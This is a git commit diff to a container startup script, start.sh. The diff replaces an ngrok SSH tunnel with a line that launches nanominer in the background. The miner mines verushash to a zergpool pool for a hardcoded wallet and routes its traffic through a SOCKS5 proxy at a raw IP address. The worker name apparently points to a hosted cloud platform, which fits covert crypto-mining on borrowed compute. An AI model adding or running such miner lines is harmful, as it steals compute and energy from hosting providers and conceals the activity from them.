1ecef608627b5f4ea6167426f8b36e76f1168915
saihajinsamab255 <108542881+saihajinsamab255@users.noreply.github.com>
2022-07-26 23:55:21 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,8 +3,5 @@ source /app/config.sh
 
 service ssh start
 service nginx start
-
-echo "set ngrok token: $NGROK_TOKEN"
-ngrok authtoken $NGROK_TOKEN
-echo "start ngrok service"
-ngrok tcp 22 --log=stdout > ngrok.log
+cd /nanominer/3.5.2
+nohup ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log
